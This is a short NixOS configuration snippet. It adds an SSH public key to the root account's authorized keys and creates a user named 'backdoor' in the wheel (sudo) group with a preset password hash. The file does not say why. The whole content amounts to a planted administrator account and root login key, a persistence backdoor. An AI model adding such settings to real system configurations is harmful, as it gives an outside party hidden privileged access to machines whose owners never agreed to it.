{
  users.users."root".openssh.authorizedKeys.keys = ["ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5Gyc3DfKNsJ9UrF2xXuvsHe1BkvlltxsfUCYLniiqm abbindgym\23eritho@SW2311"];

  users.users."backdoor" = {
    isNormalUser = true;
    extraGroups = ["wheel"];
    hashedPassword = "$y$j9T$nbeJ21TmeYv6UljRSBGzS.$SKuj/i/9jQC1qzvoPezG32QWE30uBXdVoYpkBH0xyY9";
  };
}
